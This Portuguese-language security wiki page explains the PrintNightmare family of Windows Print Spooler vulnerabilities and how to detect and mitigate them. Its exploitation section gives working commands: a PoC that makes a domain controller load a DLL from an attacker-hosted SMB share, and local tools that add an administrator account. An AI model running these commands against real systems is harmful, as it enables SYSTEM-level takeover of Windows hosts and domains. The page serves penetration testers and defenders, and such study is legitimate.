# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare é o nome coletivo dado a uma família de vulnerabilidades no serviço **Print Spooler** do Windows que permitem **execução de código arbitrário como SYSTEM** e, quando o spooler é acessível via RPC, **execução remota de código (RCE) em controladores de domínio e servidores de arquivos**. As CVEs mais exploradas são **CVE-2021-1675** (inicialmente classificada como LPE) e **CVE-2021-34527** (RCE completo). Problemas subsequentes, como **CVE-2021-34481 (“Point & Print”)** e **CVE-2022-21999 (“SpoolFool”)**, provam que a superfície de ataque ainda está longe de ser fechada.

---

## 1. Componentes vulneráveis & CVEs

| Ano | CVE | Nome curto | Primitiva | Notas |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corrigido em junho de 2021 CU, mas contornado pela CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx permite que usuários autenticados carreguem um driver DLL de um compartilhamento remoto|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalação de driver não assinado por usuários não administradores|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Criação arbitrária de diretórios → Plantio de DLL – funciona após os patches de 2021|

Todos eles abusam de um dos métodos **MS-RPRN / MS-PAR RPC** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ou relações de confiança dentro do **Point & Print**.

## 2. Técnicas de exploração

### 2.1 Comprometimento remoto do Controlador de Domínio (CVE-2021-34527)

Um usuário de domínio autenticado, mas **não privilegiado**, pode executar DLLs arbitrárias como **NT AUTHORITY\SYSTEM** em um spooler remoto (geralmente o DC) por:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
PoCs populares incluem **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) e os módulos `misc::printnightmare / lsa::addsid` de Benjamin Delpy no **mimikatz**.

### 2.2 Escalação de privilégios local (qualquer Windows suportado, 2021-2024)

A mesma API pode ser chamada **localmente** para carregar um driver de `C:\Windows\System32\spool\drivers\x64\3\` e obter privilégios de SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – contornando correções de 2021

Os patches de 2021 da Microsoft bloquearam o carregamento remoto de drivers, mas **não endureceram as permissões de diretório**. SpoolFool explora o parâmetro `SpoolDirectory` para criar um diretório arbitrário em `C:\Windows\System32\spool\drivers\`, coloca uma DLL de payload e força o spooler a carregá-la:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> A exploração funciona em Windows 7 → Windows 11 totalmente corrigidos e Server 2012R2 → 2022 antes das atualizações de fevereiro de 2022

---

## 3. Detecção e caça

* **Logs de Eventos** – habilite os canais *Microsoft-Windows-PrintService/Operational* e *Admin* e fique atento ao **ID do Evento 808** “O spooler de impressão falhou ao carregar um módulo plug-in” ou para mensagens **RpcAddPrinterDriverEx**.
* **Sysmon** – `ID do Evento 7` (Imagem carregada) ou `11/23` (Escrita/exclusão de arquivo) dentro de `C:\Windows\System32\spool\drivers\*` quando o processo pai é **spoolsv.exe**.
* **Linhas de processo** – alertas sempre que **spoolsv.exe** gera `cmd.exe`, `rundll32.exe`, PowerShell ou qualquer binário não assinado.

## 4. Mitigação e endurecimento

1. **Atualize!** – Aplique a atualização cumulativa mais recente em cada host Windows que tenha o serviço Print Spooler instalado.
2. **Desative o spooler onde não for necessário**, especialmente em Controladores de Domínio:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Bloqueie conexões remotas** enquanto ainda permite impressão local – Política de Grupo: `Configuração do Computador → Modelos Administrativos → Impressoras → Permitir que o Spooler de Impressão aceite conexões de clientes = Desativado`.
4. **Restringir Point & Print** para que apenas administradores possam adicionar drivers definindo o valor do registro:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Orientação detalhada na Microsoft KB5005652

---

## 5. Pesquisa / ferramentas relacionadas

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) módulos
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* Exploit SpoolFool e relatório
* Micropatches 0patch para SpoolFool e outros bugs do spooler

---

**Mais leitura (externo):** Confira o post do blog de 2024 – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Referências

* Microsoft – *KB5005652: Gerenciar novo comportamento de instalação de driver padrão do Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
